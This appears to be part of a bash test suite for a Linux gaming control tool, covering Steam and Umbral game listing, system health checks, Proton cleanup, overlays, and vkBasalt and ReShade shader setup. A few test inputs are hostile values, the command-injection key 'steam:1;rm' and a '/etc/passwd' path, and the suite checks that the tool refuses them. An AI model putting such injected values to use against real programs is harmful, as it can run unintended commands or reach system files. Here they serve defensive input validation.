          {"id":"1484d426be","name":"Pokemon Iberia","kind":"custom","prefix_id":"p-game-2","exe":"$HOME/Games/umbral/games/Poke/Game.exe","playtime":145,"last_played":"2026-09-30T11:34:25"},
          {"id":"hid","name":"Hidden one","kind":"custom","prefix_id":"p-game-2","exe":"","hidden":true}]}
EOF
G="$("$CD" games)"
eq "Umbral games listed next to Steam's (hidden ones skipped)" "$(jq '[.[] | select(.source == "umbral")] | length' <<<"$G")" 3
eq "key keeps Umbral's id (with colons)" "$(jq -r '.[] | select(.name == "WoW") | .key' <<<"$G")" "umbral:battlenet:wow"
eq "prefix and Proton from Umbral's config" "$(jq -r '.[] | select(.name == "Pokemon Iberia") | "\(.prefixName)/\(.compat)"' <<<"$G")" "Game/GE-Proton"
eq "game folder size" "$(jq -r '.[] | select(.name == "Pokemon Iberia") | .size' <<<"$G")" 5000
eq "playtime and last play" "$(jq -r '.[] | select(.name == "Pokemon Iberia") | "\(.playtime) \(.lastPlayed)"' <<<"$G")" "145 2026-09-30T11:34:25"
eq "Umbral prefix named from Umbral's config" "$("$CD" prefixes | jq -r --arg p "$HOME/Games/umbral/game-2" '.prefixes[] | select(.path == $p) | "\(.owner)/\(.name)"')" "umbral/Game"
mkdir -p "$T/proc2/6000" "$T/proc2/6001"
printf '%s\0%s\0' "/usr/bin/umu-run" 'C:\games\Poke\Game.exe' > "$T/proc2/6000/cmdline"
printf '%s\0%s\0' "grep" "WowB.exe.bak" > "$T/proc2/6001/cmdline"
eq "running Umbral game found by its .exe (Windows path too), no partial matches" "$(PROC_ROOT="$T/proc2" "$CD" gstatus | jq -c '[.running[] | .key]')" '["umbral:1484d426be"]'
rm -f "$T/umbral.log" "$T/steam.log"
"$CD" gplay umbral:1484d426be >/dev/null
has "PLAY starts an Umbral game through Umbral" "$(cat "$T/umbral.log")" "umbral --launch 1484d426be"
"$CD" gplay steam:100 >/dev/null
has "PLAY starts a Steam game through Steam" "$(cat "$T/steam.log")" "steam://rungameid/100"
"$CD" gplay umbral:nope >/dev/null 2>&1; eq "unknown Umbral game refused" "$?" 2
"$CD" gplay 'steam:1;rm' >/dev/null 2>&1; eq "bad key refused" "$?" 2
unset CONTROL_DECK_STEAM_ROOT CONTROL_DECK_STEAM_RUNNING CONTROL_DECK_UMBRAL_CONFIG
# ---------------------------------------------------------- 2.9 health ----
section "gaming health"
H="$T/health"; mkdir -p "$H/db" "$H/sys/class/drm/card1/device" "$H/sys/drivers/amdgpu" "$H/proc/sys/vm"
fakepkg() { mkdir -p "$H/db/$1-$2"; }
echo 0x1002 > "$H/sys/class/drm/card1/device/vendor"
ln -s ../../../../drivers/amdgpu "$H/sys/class/drm/card1/device/driver"
mkdir -p "$H/sys/class/drm/card1-DP-1"; echo 65536 > "$H/proc/sys/vm/max_map_count"
printf '[options]\n#[multilib]\n#Include = /etc/pacman.d/mirrorlist\n' > "$H/pacman.conf"
fakepkg mesa 1:26.2.3-1; fakepkg vulkan-radeon 1:26.2.3-1; fakepkg amdvlk 2025.Q2.1-1
fakepkg vulkan-icd-loader 1.4.357-1; fakepkg lib32-vulkan-icd-loader 1.4.357-1; fakepkg lib32-gnutls 3.8-1
fakepkg lib32-mesa-git 26.3-1        # a prefix of lib32-mesa must not count as it
stub vulkaninfo 'printf "Devices:\n=======\nGPU0:\n\tdeviceType = PHYSICAL_DEVICE_TYPE_CPU\n\tdeviceName = llvmpipe\n\tdriverName = llvmpipe\n"'
stub modinfo 'exit ${FAKE_NTSYNC_MOD:-1}'
hrun() { CONTROL_DECK_PACMAN_DB="$H/db" CONTROL_DECK_SYSFS="$H/sys" CONTROL_DECK_PROCFS="$H/proc" \
         CONTROL_DECK_PACMAN_CONF="$H/pacman.conf" CONTROL_DECK_NTSYNC_DEV="$H/ntsync" "$CD" health; }
HJ="$(hrun)"
st() { jq -r --arg id "$1" '.checks[] | select(.id == $id) | .status' <<<"$HJ"; }
fx() { jq -r --arg id "$1" '.checks[] | select(.id == $id) | .fix' <<<"$HJ"; }
eq "AMD card found from sysfs (connector entries ignored)" "$(jq -c .vendors <<<"$HJ")" '["amd"]'
eq "commented [multilib] is disabled" "$(st multilib)" fail
eq "low vm.max_map_count warned" "$(st max_map_count)" warn
eq "no ntsync module → info only" "$(st ntsync)" info
eq "amdgpu driver in use" "$(st amd:module)" ok
eq "missing 32-bit Mesa/RADV fails" "$(st pkg:mesa)" fail
eq "fix installs exactly what is missing" "$(fx pkg:mesa)" "sudo pacman -S --needed lib32-mesa lib32-vulkan-radeon"
eq "AMDVLK flagged for removal" "$(fx amd:amdvlk)" "sudo pacman -Rns amdvlk"
eq "Vulkan with only a software renderer fails" "$(st vulkan:device)" fail
eq "no 32-bit audio warned" "$(st lib32:audio)" warn
eq "one command for everything missing" "$(jq -r .installAll <<<"$HJ")" "sudo pacman -S --needed lib32-mesa lib32-pipewire lib32-vulkan-radeon"
eq "counts" "$(jq -c '[.fail, .warn]' <<<"$HJ")" "[3,3]"
HJ="$(FAKE_NTSYNC_MOD=0 hrun)"; eq "ntsync module present but not loaded → load command" "$(st ntsync)" warn
# NVIDIA, updated without a reboot
rm -rf "$H/sys" "$H/db"; mkdir -p "$H/sys/class/drm/card0/device" "$H/sys/drivers/nvidia" "$H/sys/module/nvidia" "$H/sys/module/nvidia_drm/parameters"
echo 0x10de > "$H/sys/class/drm/card0/device/vendor"; ln -s ../../../../drivers/nvidia "$H/sys/class/drm/card0/device/driver"
echo 610.10 > "$H/sys/module/nvidia/version"; echo Y > "$H/sys/module/nvidia_drm/parameters/modeset"
echo 1048576 > "$H/proc/sys/vm/max_map_count"; touch "$H/ntsync"; printf '[multilib]\nInclude = /etc/pacman.d/mirrorlist\n' > "$H/pacman.conf"
fakepkg nvidia-utils 615.71.09-1; fakepkg lib32-nvidia-utils 615.71.09-1
fakepkg vulkan-icd-loader 1-1; fakepkg lib32-vulkan-icd-loader 1-1; fakepkg lib32-pipewire 1-1; fakepkg lib32-gnutls 1-1
stub vulkaninfo 'printf "GPU0:\n\tdeviceType = PHYSICAL_DEVICE_TYPE_DISCRETE_GPU\n\tdeviceName = NVIDIA GeForce RTX 2070\n\tdriverName = NVIDIA\n"'
HJ="$(hrun)"
eq "multilib, max_map_count, ntsync ok" "$(st multilib)$(st max_map_count)$(st ntsync)" okokok
eq "driver updated but kernel module old → reboot" "$(fx nvidia:sync)" reboot
has "…and says which versions" "$(jq -r '.checks[] | select(.id == "nvidia:sync") | .detail' <<<"$HJ")" "615.71.09 but the loaded kernel module is 610.10"
eq "Vulkan sees the GPU" "$(jq -r '.checks[] | select(.id == "vulkan:device") | .detail' <<<"$HJ")" "NVIDIA GeForce RTX 2070 · NVIDIA"
echo 615.71.09 > "$H/sys/module/nvidia/version"; rm -rf "$H/db/lib32-nvidia-utils-615.71.09-1"; fakepkg lib32-nvidia-utils 610.10-1
HJ="$(hrun)"; eq "32-bit driver out of sync → full update" "$(fx nvidia:sync)" "sudo pacman -Syu"
rm -rf "$H/db/lib32-nvidia-utils-610.10-1"; fakepkg lib32-nvidia-utils 615.71.09-1; echo N > "$H/sys/module/nvidia_drm/parameters/modeset"
HJ="$(hrun)"
eq "all in sync" "$(st nvidia:sync)" ok
has "modeset off → modprobe option" "$(fx nvidia:modeset)" "options nvidia_drm modeset=1"
eq "nothing to install" "$(jq -r .installAll <<<"$HJ")" ""
rm -f "$T/bin/vulkaninfo" "$T/bin/modinfo"
# ------------------------------------------------ CLEAN: gaming rows ----
section "clean: unused Proton versions"
PT="$HOME/steam-pt"; mkdir -p "$PT/config" "$PT/steamapps"
cat > "$PT/config/config.vdf" <<'EOF'
"InstallConfigStore"
{
	"Software"
	{
		"Valve"
		{
			"Steam"
			{
				"CompatToolMapping"
				{
					"570"
					{
						"name"		"steam_mapped"
						"config"		""
						"priority"		"250"
					}
				}
			}
		}
	}
}
EOF
mktool() {   # dir internal-name version
    mkdir -p "$PT/compatibilitytools.d/$1"; touch "$PT/compatibilitytools.d/$1/proton"
    printf '"compatibilitytools"\n{\n  "compat_tools"\n  {\n    "%s" // internal name\n    {\n    }\n  }\n}\n' "$2" \
        > "$PT/compatibilitytools.d/$1/compatibilitytool.vdf"
    echo "1700000000 $3" > "$PT/compatibilitytools.d/$1/version"
    head -c 4096 /dev/zero > "$PT/compatibilitytools.d/$1/files.bin"
}
mktool "Mapped Dir" steam_mapped Mapped-1
mktool GE-Proton9-1 GE-Proton9-1 GE-Proton9-1
mktool GE-Proton10-3 GE-Proton10-3 GE-Proton10-3
mktool OldPfx OldPfx Old-7
mktool "Busy One" busy Busy-1
mktool "Spare Tool" spare Spare-2
mkdir -p "$HOME/Games/umbral/pfx/drive_c"; touch "$HOME/Games/umbral/pfx/system.reg"; echo Old-7 > "$HOME/Games/umbral/pfx/version"
echo '{"prefixes":[{"id":"p","name":"P","path":"'"$HOME"'/Games/umbral/pfx","runner":"GE-Proton"}],"games":[]}' > "$T/umbral-pt.json"
mkdir -p "$T/proc-pt/7000"; printf '%s\0%s\0' "$PT/compatibilitytools.d/Busy One/files/bin/wine" game.exe > "$T/proc-pt/7000/cmdline"
ptrun() { CONTROL_DECK_STEAM_ROOT="$PT" CONTROL_DECK_STEAM_RUNNING=0 CONTROL_DECK_UMBRAL_CONFIG="$T/umbral-pt.json" PROC_ROOT="$T/proc-pt" "$CD" "$@"; }
CS="$(ptrun cleanscan)"
eq "tools nothing uses (Steam-mapped, Umbral's newest GE, a prefix's Proton and a running one are kept)" \
   "$(jq -r '.[] | select(.id == "protons") | .details' <<<"$CS")" "GE-Proton9-1 · spare"
yes "its size is measured (folder name with spaces)" "(( $(jq '.[] | select(.id == "protons") | .bytes' <<<"$CS") >= 4096 ))"
echo '{"prefixes":[{"id":"p","name":"P","path":"'"$HOME"'/Games/umbral/pfx","runner":"GE-Proton9-1"}],"games":[]}' > "$T/umbral-pt.json"
eq "an explicit Umbral runner keeps that one and frees the newest GE" \
   "$(ptrun cleanscan | jq -r '.[] | select(.id == "protons") | .details')" "GE-Proton10-3 · spare"
echo '{"prefixes":[],"games":[]}' > "$T/umbral-pt.json"; rm -rf "$PT/compatibilitytools.d/GE-Proton10-3"
ptrun clean protons >/dev/null 2>&1
eq "clean removes exactly the unused ones" "$(ls "$PT/compatibilitytools.d" | paste -sd ,)" "Busy One,Mapped Dir,OldPfx"
eq "shader and prefix rows present" "$(ptrun cleanscan | jq -c '[.[] | select(.id == "shaders" or .id == "prefixes") | .count]')" "[0,0]"
rm -rf "$HOME/Games/umbral/pfx" "$PT"
# ------------------------------------------------ temperature overlay ----
section "temperature overlay"
TS="$T/tsys/class/hwmon"; mkdir -p "$TS/hwmon0" "$TS/hwmon1" "$TS/hwmon2"
echo acpitz > "$TS/hwmon0/name"; echo 27000 > "$TS/hwmon0/temp1_input"
echo coretemp > "$TS/hwmon1/name"
echo "Core 0" > "$TS/hwmon1/temp2_label"; echo 44000 > "$TS/hwmon1/temp2_input"
echo "Package id 0" > "$TS/hwmon1/temp1_label"; echo 48500 > "$TS/hwmon1/temp1_input"
echo amdgpu > "$TS/hwmon2/name"
echo junction > "$TS/hwmon2/temp2_label"; echo 80000 > "$TS/hwmon2/temp2_input"
echo edge > "$TS/hwmon2/temp1_label"; echo 61000 > "$TS/hwmon2/temp1_input"
eq "Intel package temp + AMD GPU edge temp" "$(CONTROL_DECK_SYSFS="$T/tsys" CONTROL_DECK_GPU_VENDOR=amd "$CD" temps | paste -sd ' ')" "CPU=48 GPU=61"
echo k10temp > "$TS/hwmon1/name"; echo Tctl > "$TS/hwmon1/temp1_label"
eq "AMD CPU (k10temp Tctl)" "$(CONTROL_DECK_SYSFS="$T/tsys" CONTROL_DECK_GPU_VENDOR=amd "$CD" temps | head -1)" "CPU=48"
rm -rf "$TS/hwmon1"
eq "no CPU chip → ACPI fallback" "$(CONTROL_DECK_SYSFS="$T/tsys" CONTROL_DECK_GPU_VENDOR=amd "$CD" temps | head -1)" "CPU=27"
eq "pid alive" "$(CONTROL_DECK_SYSFS="$T/tsys" "$CD" temps $$ | tail -1)" "ALIVE=1"
eq "pid gone" "$(CONTROL_DECK_SYSFS="$T/tsys" "$CD" temps 99999999 | tail -1)" "ALIVE=0"
stub qs 'echo "qs $* pid=$CD_OVERLAY_PID ldp=${LD_LIBRARY_PATH:-none} pre=${LD_PRELOAD:-none}" >> "'"$T"'/qs.log"'
touch "$T/overlay.qml"; export CONTROL_DECK_OVERLAY_QML="$T/overlay.qml"
"$CD" gprofile set steam:300 overlay=maybe >/dev/null 2>&1; eq "overlay must be true/false" "$?" 2
"$CD" gprofile set steam:300 overlay=true gamemode=false >/dev/null
printf '#!/bin/sh\necho "pid=$$"\n' > "$T/fake/ogame"; chmod +x "$T/fake/ogame"
rm -f "$T/qs.log"; O="$(SteamAppId=300 "$CD" run "$T/fake/ogame")"
for _ in $(seq 25); do [[ -s "$T/qs.log" ]] && break; sleep 0.2; done
eq "overlay started with the game's own pid (the wrapper execs into the game)" "$(grep -o 'pid=[0-9]*' "$T/qs.log")" "$O"
has "…from the overlay config" "$(cat "$T/qs.log")" "qs -p $T/overlay.qml"
rm -f "$T/qs.log"; LD_LIBRARY_PATH=/steam/pinned_libs LD_PRELOAD=/steam/gameoverlayrenderer.so SteamAppId=300 "$CD" run "$T/fake/ogame" >/dev/null
for _ in $(seq 25); do [[ -s "$T/qs.log" ]] && break; sleep 0.2; done
has "Steam's LD_LIBRARY_PATH / LD_PRELOAD don't reach the overlay (they break Qt)" "$(cat "$T/qs.log")" "ldp=none pre=none"
rm -f "$T/qs.log"; SteamAppId=301 "$CD" run "$T/fake/ogame" >/dev/null; sleep 0.3
yes "no overlay when the profile doesn't ask for it" "[[ ! -e '$T/qs.log' ]]"
unset CONTROL_DECK_OVERLAY_QML; "$CD" gprofile reset steam:300 >/dev/null
# ------------------------------------------------------ visual shaders ----
section "visual shaders (vkBasalt)"
FXS="$T/fxsrc"; mkdir -p "$FXS/pkgA/Pack-main/Shaders" "$FXS/pkgA/Pack-main/Textures" "$FXS/sfx/games/game/7" "$FXS/sfx/games/preset/501/download" "$FXS/sfx/games/game/search"
cat > "$FXS/pkgA/Pack-main/Shaders/Vibrance.fx" <<'EOF'
uniform float Vibrance < ui_type = "slider"; > = 0.15;
uniform float3 VibranceRGBBalance < ui_type = "drag"; > = float3(1.0, 1.0, 1.0);
technique Vibrance { pass { } }
EOF
cat > "$FXS/pkgA/Pack-main/Shaders/Multi.fx" <<'EOF'
uniform float Amount < > = 1.0;
technique First { pass { } }
technique Second { pass { } }
EOF
cat > "$FXS/pkgA/Pack-main/Shaders/DOF.fx" <<'EOF'
float d = ReShade::GetLinearizedDepth(uv);
technique DOF { pass { } }
EOF
echo 'template' > "$FXS/pkgA/Pack-main/Shaders/Template.fx"
echo png > "$FXS/pkgA/Pack-main/Textures/lut.png"
( cd "$FXS/pkgA" && bsdtar -a -cf "$FXS/pack.zip" Pack-main )
cat > "$FXS/EffectPackages.ini" <<EOF
[00]
Enabled=1
Required=1
PackageName=Test pack
PackageDescription=test
InstallPath=.\reshade-shaders\Shaders\Sub
DownloadUrl=file://$FXS/pack.zip
EffectFiles=Vibrance.fx,Multi.fx,DOF.fx
DenyEffectFiles=Template.fx
EOF
echo '{"Games": [{"title": "Test Game", "url": "/games/game/7/"}]}' > "$FXS/sfx/games/game/search/q_Test_Game.json"
echo '<a href="/games/preset/499/">Old one</a> <a href="/games/preset/501/">Nice &amp; sharp</a>' > "$FXS/sfx/games/game/7/index.html"
printf -- '--> Nice preset\r\nTechniques=Vibrance@Vibrance.fx,Second@Multi.fx,DOF@DOF.fx,Missing@Missing.fx\r\n\r\n[Vibrance.fx]\r\nVibrance=0.300000\r\nVibranceRGBBalance=1.000000,0.900000,1.000000\r\n' > "$FXS/sfx/games/preset/501/download/index.html"
cat > "$FXS/awacy.json" <<'EOF'
[{"name":"Shooter","anticheats":["Easy Anti-Cheat"],"status":"Denied","storeIds":{"steam":"4000"}}]
EOF
echo '{"4000":{"success":true,"data":{"categories":[{"id":1}]}}}' > "$FXS/store-4000.json"
echo '{"4001":{"success":true,"data":{"categories":[{"id":2},{"id":36}]}}}' > "$FXS/store-4001.json"
echo '{"4002":{"success":true,"data":{"categories":[{"id":2}]}}}' > "$FXS/store-4002.json"
export CONTROL_DECK_FX_PACKAGES_URL="file://$FXS/EffectPackages.ini" CONTROL_DECK_SFX_URL="file://$FXS/sfx" \
       CONTROL_DECK_AWACY_URL="file://$FXS/awacy.json"
# the store API URL carries ?appids=…: serve per-id files through a tiny wrapper URL
fxon() { CONTROL_DECK_STEAM_STORE_API="file://$FXS/store-$1.json#" "$CD" fx status "steam:$1" | jq -c '.online | [.level, .anticheats]'; }
eq "anti-cheat game (AreWeAntiCheatYet)" "$(fxon 4000)" '["anticheat",["Easy Anti-Cheat"]]'
eq "online PvP without anti-cheat" "$(fxon 4001)" '["online",[]]'
eq "single-player" "$(fxon 4002)" '["none",[]]'
eq "packages parsed from the official list" "$("$CD" fx packages | jq -c '.[0] | [.name, .default, .sub, (.files | length), .installed]')" '["Test pack",true,"Sub",3,false]'
"$CD" fx package 00 >/dev/null
FXD="$HOME/.local/share/control-deck/reshade"
yes "shaders keep the package folder" "[[ -f '$FXD/Shaders/Sub/Vibrance.fx' ]]"
yes "textures are flattened (one folder for vkBasalt)" "[[ -f '$FXD/Textures/lut.png' ]]"
yes "DenyEffectFiles removed" "[[ ! -e '$FXD/Shaders/Sub/Template.fx' ]]"
eq "marked installed" "$("$CD" fx packages | jq '.[0].installed')" true
eq "search on SweetFX DB" "$("$CD" fx search Test Game)" '[{"title":"Test Game","id":"7"}]'
eq "presets of a game, newest first, entities decoded" "$("$CD" fx presets 7 | jq -c '[.[] | [.id, .name]]')" '[["501","Nice & sharp"],["499","Old one"]]'
"$CD" fx set steam:4002 builtin:nope >/dev/null 2>&1; eq "unknown look refused" "$?" 2
"$CD" fx set steam:4002 sfx:501 >/dev/null 2>&1
FXC="$HOME/.local/share/control-deck/gaming/fx/steam_4002"
R="$(cat "$FXC/report.json")"
eq "only the effect vkBasalt can run is applied" "$(jq -c .effects <<<"$R")" '["Vibrance.fx"]'
has "second technique of a file skipped" "$(jq -r '.skipped[] | select(.effect == "Second") | .why' <<<"$R")" "only runs the first technique"
has "depth effect skipped" "$(jq -r '.skipped[] | select(.effect == "DOF") | .why' <<<"$R")" "depth buffer"
has "missing shader skipped" "$(jq -r '.skipped[] | select(.effect == "Missing") | .why' <<<"$R")" "not found"
eq "vector with different components left at default" "$(jq -c .partial <<<"$R")" '[{"file":"Vibrance.fx","value":"VibranceRGBBalance"}]'
has "config points at the shader" "$(cat "$FXC/vkBasalt.conf")" "fx1 = \"$FXD/Shaders/Sub/Vibrance.fx\""
has "preset value carried over" "$(cat "$FXC/vkBasalt.conf")" "Vibrance = 0.300000"
eq "profile flag on" "$("$CD" gprofile get steam:4002 | jq .fx)" true
printf '#!/bin/sh\necho "vkb=$ENABLE_VKBASALT conf=$VKBASALT_CONFIG_FILE"\n' > "$T/fake/fxgame"; chmod +x "$T/fake/fxgame"
eq "wrapper enables vkBasalt with the game's config" "$(SteamAppId=4002 "$CD" run "$T/fake/fxgame")" "vkb=1 conf=$FXC/vkBasalt.conf"
"$CD" fx set steam:4002 builtin:sharpen-aa >/dev/null
eq "built-in look" "$(grep '^effects' "$FXC/vkBasalt.conf")" "effects = smaa:cas"
"$CD" fx set steam:4002 off >/dev/null
eq "off: wrapper leaves vkBasalt alone" "$(SteamAppId=4002 "$CD" run "$T/fake/fxgame")" "vkb= conf="
printf 'https://www.nexusmods.com/x/mods/1' > "$FXS/sfx/games/preset/501/download/index.html"
O="$("$CD" fx set steam:4002 sfx:501 2>&1)"; eq "a link instead of a preset is refused" "$?" 4
has "…saying what it is" "$O" "not a ReShade preset"
unset CONTROL_DECK_FX_PACKAGES_URL CONTROL_DECK_SFX_URL CONTROL_DECK_AWACY_URL
# ------------------------------------------------ ReShade under Proton ----
section "ReShade (DLL) under Proton"
RS="$T/rs"; mkdir -p "$RS/web/downloads" "$RS/zip" "$RS/ff/win64/ach" "$RS/ff/win32/ach" "$RS/7z/core"
echo '<a href="/downloads/ReShade_Setup_6.9.1_Addon.exe">addon</a> <a href="/downloads/ReShade_Setup_6.9.1.exe">get</a>' > "$RS/web/index.html"
echo dll64 > "$RS/zip/ReShade64.dll"; echo dll32 > "$RS/zip/ReShade32.dll"
( cd "$RS/zip" && bsdtar -a -cf ../r.zip ReShade64.dll ReShade32.dll )
{ printf 'MZ'; head -c 512 /dev/zero; cat "$RS/r.zip"; } > "$RS/web/downloads/ReShade_Setup_6.9.1.exe"
echo d3dc > "$RS/7z/core/d3dcompiler_47.dll"
( cd "$RS/7z" && bsdtar --format 7zip -cf "$RS/ff.7z" core )
cp "$RS/ff.7z" "$RS/ff/win64/ach/Firefox%20Setup%2062.0.3.exe"; cp "$RS/ff.7z" "$RS/ff/win32/ach/Firefox%20Setup%2062.0.3.exe"
FFSHA="$(sha256sum "$RS/ff.7z" | cut -d' ' -f1)"
# a minimal 64-bit PE that imports dxgi.dll
mkpe() {   # out dllname machine(0x8664|0x14c)
    python3 - "$@" <<'PYPE'
import struct, sys
out, dll, mach = sys.argv[1], sys.argv[2].encode(), int(sys.argv[3], 16)
pe64 = mach == 0x8664; optsz = 240 if pe64 else 224
d = bytearray(0x400)
d[0:2] = b'MZ'; struct.pack_into('<I', d, 0x3C, 0x40)
d[0x40:0x44] = b'PE\0\0'; struct.pack_into('<HH', d, 0x44, mach, 1); struct.pack_into('<H', d, 0x54, optsz)
opt = 0x58; struct.pack_into('<H', d, opt, 0x20b if pe64 else 0x10b)
ddir = opt + (112 if pe64 else 96); struct.pack_into('<II', d, ddir + 8, 0x1000, 40)
sec = opt + optsz; d[sec:sec+8] = b'.idata\0\0'; struct.pack_into('<IIII', d, sec + 8, 0x200, 0x1000, 0x200, 0x200)
struct.pack_into('<I', d, 0x200 + 12, 0x1000 + 40); d[0x200 + 40:0x200 + 40 + len(dll)] = dll
open(out, 'wb').write(bytes(d) + b'\0' * 200000)
PYPE
}
export CONTROL_DECK_STEAM_ROOT="$ST" CONTROL_DECK_STEAM_RUNNING=0 CONTROL_DECK_RESHADE_URL="file://$RS/web" \
       CONTROL_DECK_FF_D3DC_URL="file://$RS/ff" CONTROL_DECK_FF_D3DC_SHA64="$FFSHA" CONTROL_DECK_FF_D3DC_SHA32="$FFSHA" \
       CONTROL_DECK_FX_PACKAGES_URL="file://$FXS/EffectPackages.ini" CONTROL_DECK_SFX_URL="file://$FXS/sfx" \
       CONTROL_DECK_AWACY_URL="file://$FXS/awacy.json" CONTROL_DECK_STEAM_STORE_API="file://$FXS/store-4002.json#"
man 5000 "Story Game" StoryGame 100
SG="$ST/steamapps/common/StoryGame"; mkdir -p "$SG/Binaries/Win64" "$SG/Redist"
mkpe "$SG/StoryGame.exe" kernel32.dll 0x8664
mkpe "$SG/Binaries/Win64/StoryGame-Win64-Shipping.exe" dxgi.dll 0x8664
mkpe "$SG/Binaries/Win64/CrashReportClient.exe" kernel32.dll 0x8664
mkpe "$SG/Redist/vcredist_x64.exe" kernel32.dll 0x8664
mkpe "$SG/Binaries/Win64/Old9.exe" d3d9.dll 0x14c
EX="$("$CD" fx exes steam:5000)"
eq "Unreal Shipping exe first, crash reporter and redist left out" "$(jq -c '[.[] | .rel]' <<<"$EX")" '["Binaries/Win64/StoryGame-Win64-Shipping.exe","StoryGame.exe","Binaries/Win64/Old9.exe"]'
eq "arch and API from the PE imports (DLLs beside it count)" "$(jq -c '[.[] | [.arch, .api]]' <<<"$EX")" '[[64,"dxgi"],[64,"unknown"],[32,"dxgi"]]'
"$CD" fx reshade install >/dev/null 2>&1
FXB="$HOME/.local/share/control-deck/reshade/bin"
eq "latest non-addon ReShade from the site" "$(readlink "$FXB/current")" "ReShade-6.9.1"
eq "DLLs pulled out of the installer" "$(cat "$FXB/current/ReShade64.dll")" dll64
eq "d3dcompiler_47 from the (checksummed) Firefox installer" "$(cat "$FXB/d3dcompiler_47.dll.64")" d3dc
rm -f "$FXB/d3dcompiler_47.dll.32"
CONTROL_DECK_FF_D3DC_SHA32=0000 "$CD" fx reshade install >/dev/null 2>&1; eq "checksum mismatch refused" "$?" 4
yes "…and nothing kept" "[[ ! -e '$FXB/d3dcompiler_47.dll.32' ]]"
"$CD" fx reshade install >/dev/null 2>&1
BEFORE="$(ls -A "$SG/Binaries/Win64" | paste -sd ,)"
"$CD" fx mode steam:5000 reshade >/dev/null 2>&1
W="$SG/Binaries/Win64"
eq "dxgi.dll → ReShade64 beside the Shipping exe" "$(readlink "$W/dxgi.dll")" "$FXB/current/ReShade64.dll"
eq "d3dcompiler_47 linked (64-bit)" "$(readlink "$W/d3dcompiler_47.dll")" "$FXB/d3dcompiler_47.dll.64"
has "ReShade.ini: shaders searched recursively (Windows path)" "$(cat "$W/ReShade.ini")" 'EffectSearchPaths=Z:'"${HOME//\//\\}"'\.local\share\control-deck\reshade\Shaders\**'
has "…preset kept in the deck's folder" "$(cat "$W/ReShade.ini")" 'PresetPath=Z:'"${HOME//\//\\}"'\.local\share\control-deck\gaming\fx\steam_5000\ReShadePreset.ini'
printf '#!/bin/sh\necho "o=$WINEDLLOVERRIDES vkb=$ENABLE_VKBASALT"\n' > "$T/fake/rsgame"; chmod +x "$T/fake/rsgame"
"$CD" fx set steam:5000 sfx:501 >/dev/null 2>&1 || true
printf -- '--> Nice preset\r\nTechniques=Vibrance@Vibrance.fx,DOF@DOF.fx,Missing@Missing.fx\r\n\r\n[Vibrance.fx]\r\nVibrance=0.300000\r\n' > "$FXS/sfx/games/preset/501/download/index.html"
"$CD" fx set steam:5000 sfx:501 >/dev/null 2>&1
RP="$HOME/.local/share/control-deck/gaming/fx/steam_5000"
has "preset used as it is (depth effects too)" "$(cat "$RP/ReShadePreset.ini")" "Techniques=Vibrance@Vibrance.fx,DOF@DOF.fx"
eq "report: only the missing shader is flagged" "$(jq -c '[.mode, .effects, [.skipped[].effect]]' "$RP/report.json")" '["reshade",["DOF.fx","Vibrance.fx"],["Missing"]]'
eq "wrapper: DLL overrides, no vkBasalt" "$(WINEDLLOVERRIDES=foo=b SteamAppId=5000 "$CD" run "$T/fake/rsgame")" "o=foo=b;d3dcompiler_47=n;dxgi=n,b vkb="
"$CD" fx mode steam:5000 reshade "$W/Old9.exe" d3d9 >/dev/null 2>&1
eq "switching exe/API moves the links" "$(readlink "$W/d3d9.dll") $([[ -e "$W/dxgi.dll" ]] && echo left || echo gone)" "$FXB/current/ReShade32.dll gone"
eq "32-bit d3dcompiler for a 32-bit exe" "$(readlink "$W/d3dcompiler_47.dll")" "$FXB/d3dcompiler_47.dll.32"
echo real > "$SG/dxgi.dll"
O="$("$CD" fx mode steam:5000 reshade "$SG/StoryGame.exe" dxgi 2>&1)"; eq "a game's own dxgi.dll is never replaced" "$?" 3
eq "…left untouched" "$(cat "$SG/dxgi.dll")" real
rm -f "$SG/dxgi.dll"
"$CD" fx mode steam:5000 reshade "$W/StoryGame-Win64-Shipping.exe" >/dev/null 2>&1
"$CD" fx set steam:5000 off >/dev/null
eq "OFF leaves the game folder as it was" "$(ls -A "$W" | paste -sd ,)" "$BEFORE"
eq "profile off" "$("$CD" gprofile get steam:5000 | jq -c '[.fx]')" '[false]'
"$CD" fx mode steam:5000 reshade /etc/passwd >/dev/null 2>&1; eq "only the game's own executables" "$?" 2
unset CONTROL_DECK_RESHADE_URL CONTROL_DECK_FF_D3DC_URL CONTROL_DECK_FF_D3DC_SHA64 CONTROL_DECK_FF_D3DC_SHA32 CONTROL_DECK_STEAM_ROOT \
      CONTROL_DECK_STEAM_RUNNING CONTROL_DECK_FX_PACKAGES_URL CONTROL_DECK_SFX_URL CONTROL_DECK_AWACY_URL CONTROL_DECK_STEAM_STORE_API
# ==========================================================================
printf '\n\e[1m%d passed, %d failed\e[0m\n' "$pass" "$failed"
[[ $failed -eq 0 ]]
